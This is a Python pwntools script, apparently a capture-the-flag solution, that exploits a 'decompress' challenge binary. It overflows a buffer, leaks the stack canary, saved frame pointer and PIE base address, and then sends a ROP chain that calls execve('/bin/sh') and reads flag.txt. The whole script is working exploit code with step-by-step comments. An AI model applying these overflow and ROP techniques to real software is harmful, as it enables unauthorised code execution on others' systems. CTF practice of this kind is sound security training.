from pwn import *

# Launch python3 ./solution.py REMOTE for remote process execution
# Launch python3 ./solution.py NO_GDB for local no gdb execution
# Launch python3 ./solution.py for local execution with gdb
if args.REMOTE:
    p = remote("server_adress_where_process_runs", port=30003)
elif args.NO_GDB:
    p = process("./decompress")
else:
    p = gdb.debug("./decompress")

def receive_very_cool_decompressor():
    l = p.recvn(len('Very Cool Decompressor v0.1') + 1)
    print("received: ", l)

def copy_command(how_many, from_where):
    return p16(how_many) + p16(from_where)

def write_command(how_many):
    return p16(how_many) + p16(0)


receive_very_cool_decompressor()

# Fill buffer(1024) and padding after it(8) with 'bbbb...bb'
fill =  b"b"*1032
fill_buffer_msg = write_command(1024 + 8) + fill
p.send(fill_buffer_msg)


# bufpos is pointing at the canary
# In GDB we can see that there is one more canary on the stack
# it is stored exactly 0x510 from current bufpos (our canary)
# copy 8 bytes from adress distant 0x510 from bufpos
copy_canary_cmnd = copy_command(8, 0x510)
p.send(copy_canary_cmnd)


# bufpos is pointing to RBP_MAIN, we want to store there RBP_MAIN
# notice that we just returned from readn() function (no operations on RSP were made inbetween)
# so the way to achieve RBP_MAIN is to copy it from RBP_READN,
# when readn is called it pushes to the stack rbp of preavius function - main   
# copy to RBP_MAIN: RBP_MAIN from stack frame of executed readn
# 1088 is the distance to begining of rbp of readn: stackframe(0x430=1072) + ret_to_main(8) + RBP_main(8)
copy_rbp_main_to_rbp_main_cmnd = copy_command(8, 1088) 
p.send(copy_rbp_main_to_rbp_main_cmnd)


# bufpos is pointing at return adress from main
# we want to obtain base adress of binary, to achieve that
# we are going to change ret adress to main, to execute it once again
# it will allow us to execute write - leak adresses we need,

# we want to jump to the begining of main and last called readn() returns to main+136
# In PIE last 1.5b in adress is constant, 136 fits in 1b, we can copy 7b and write the last one

# Firstly write the "last one" - little endian  
send_start_main_offset = write_command(1) + p8(0x14)
p.send(send_start_main_offset)

# Copy remaining 7b
cmnd_msg_copy_7b_of_main_ret_adress = copy_command(7, 1088)
p.send(cmnd_msg_copy_7b_of_main_ret_adress)


# Quit main, let write in main leak: buffer, padding, canary, RBP_main, main_adress
break_cmnd = p16(0) + p16(0)
p.send(break_cmnd)

# Receive buff + padding
p.recvn(1032)
print("Got bs")

# Leak canary
canary = u64(p.recvn(8))

# Leak main_rbp - used later as a pointer for '/bin/sh\x00' string 
main_rbp = u64(p.recvn(8)) #main rbp
print("Got canary", hex(canary), " and main RBP: ", hex(main_rbp))

# Leak adress to main
leaked_adress = u64(p.recvn(8))
# subtract binary_main_offset to get binary base adress
binary_main_func_offset = 0xa114
base_adress = leaked_adress - binary_main_func_offset
print("Leaked base adress: ", hex(base_adress))


# RUN MAIN AGAIN:

# RBP_MAIN decreases (stack decreases -> adress grows up) 8 when calling main again
main_rbp += 8

# Once again: Fill buffer(1024) and padding after it(8) with 'bbbb...bb'
p.send(fill_buffer_msg)

# Send obtained canary
p.send(write_command(8) + p64(canary))

# Under RBP, which adress we have we will store bin_sh string
p.send(write_command(8) + b"/bin/sh\00")



# Run the gadgets part:

# Gadgets obtained by ROPgadget --binary decompress > gadgets; cat gadgets | grep -e "gadget_we_look_for" 
#pop rax; ret
pop_rax = p64(base_adress + 0x0000000000051797)
#pop rdi; ret
pop_rdi = p64(base_adress + 0x0000000000009c32)
#pop rsi; ret
pop_rsi = p64(base_adress + 0x00000000000176be)
# #pop rdx; ret
pop_rdx = p64(base_adress + 0x0000000000009b3f)
# syscall
syscall = p64(base_adress + 0x0000000000009643)

# Using the gadgets prepare the arguments of syscall and use it
rop_chain = pop_rax         # Set rax to 0x3b execve syscall number
rop_chain += p64(0x3b)      
rop_chain += pop_rdi        # Set rdi to point at '/bin/sh\x00'
rop_chain += p64(main_rbp)
rop_chain += pop_rsi        # Set rsi (argv) to null
rop_chain += p64(0)
rop_chain += pop_rdx        # Set rdx (envp) to null
rop_chain += p64(0)
rop_chain += syscall        # Call syscall

# Send our rop_chain 9 instructions of 8 bytes
p.send(write_command(9*0x8) + rop_chain)  
# Break loop, return from main, execute rop_chain
p.send(break_cmnd)

# Receive stuff written by write
receive_very_cool_decompressor()
p.recv(timeout=2)


# WE OBTAINED SHELL!


# Execute cat command in shell
sleep(1)
print("Sending 'cat flag.txt'")
p.send(b"cat flag.txt\n")

# Make process interactive, so it does not stop
p.interactive()


